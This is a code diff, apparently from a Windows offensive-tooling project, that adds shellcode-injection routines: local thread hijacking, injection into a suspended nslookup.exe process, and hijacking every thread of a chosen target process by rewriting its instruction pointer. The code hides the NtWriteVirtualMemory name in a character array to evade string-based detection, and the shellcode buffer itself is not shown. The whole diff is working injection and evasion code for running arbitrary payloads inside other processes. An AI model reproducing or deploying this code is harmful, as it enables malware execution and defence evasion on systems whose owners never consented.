@@ -31,7 +31,107 @@ void test() {
 	printf("111");
 }
 
+void threadHijacking() {
+	int length = sizeof(shellcode);
 
+	CONTEXT context;
+	DWORD   dwOldProtection = NULL;
+	context.ContextFlags = CONTEXT_ALL;
+
+
+	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&test, NULL, CREATE_SUSPENDED, NULL);
+
+	LPVOID lpMem = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	memcpy(lpMem, shellcode, length);
+	VirtualProtect(lpMem, length, PAGE_EXECUTE_READWRITE, &dwOldProtection);
+
+	GetThreadContext(hThread, &context);
+	context.Rip = (DWORD64)lpMem;
+	SetThreadContext(hThread, &context);
+
+	ResumeThread(hThread);
+	WaitForSingleObject(hThread, -1);
+}
+void remoteHijacking() {
+	char str1[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
+	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);
+
+	STARTUPINFO si = { sizeof(STARTUPINFO) };
+	PROCESS_INFORMATION pi;
+	DWORD dwOldProtection;
+	CONTEXT context;
+	context.ContextFlags = CONTEXT_ALL;
+
+	CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	LPVOID lpMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	NtWriteVirtualMemory(pi.hProcess, lpMem, shellcode, sizeof(shellcode), NULL);
+	VirtualProtectEx(pi.hProcess, lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
+
+	GetThreadContext(pi.hThread, &context);
+	context.Rip = (DWORD64)lpMem;
+	SetThreadContext(pi.hThread, &context);
+
+	ResumeThread(pi.hThread);
+
+}
+LPWSTR CharToLPWSTR(const char* charStr) {
+	// 计算目标 LPWSTR 所需的字符数
+	int length = MultiByteToWideChar(CP_ACP, 0, charStr, -1, NULL, 0);
+
+	// 为 LPWSTR 分配足够的内存
+	LPWSTR lpwstr = new WCHAR[length];
+
+	// 执行转换
+	MultiByteToWideChar(CP_ACP, 0, charStr, -1, lpwstr, length);
+
+	return lpwstr;
+}
+
+void remoteEnum(DWORD targetPid) {
+
+	char str1[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
+	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);
+
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
+
+	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
+	THREADENTRY32 te32;
+	te32.dwSize = sizeof(THREADENTRY32);
+	CONTEXT context;
+	context.ContextFlags = CONTEXT_ALL;
+	DWORD dwOldProtection;
+
+	if (Thread32First(hSnapShot, &te32)) {
+		do {
+			if (te32.th32OwnerProcessID == targetPid) {
+
+
+				HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, false, te32.th32ThreadID);
+
+				if (hThread != NULL) {
+
+					LPVOID lpMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+					NtWriteVirtualMemory(hProcess, lpMem, shellcode, sizeof(shellcode), NULL);
+					VirtualProtectEx(hProcess, lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
+
+
+					SuspendThread(hThread);
+					GetThreadContext(hThread, &context);
+					context.Rip = (DWORD64)lpMem;
+					SetThreadContext(hThread, &context);
+
+					ResumeThread(hThread);
+					WaitForSingleObject(hThread, -1);
+
+				}
+
+			}
+
+		} while (Thread32Next(hSnapShot, &te32));
+	}
+
+
+}
 
 void AlertApc() {
 	DWORD dwOldProtection = NULL;
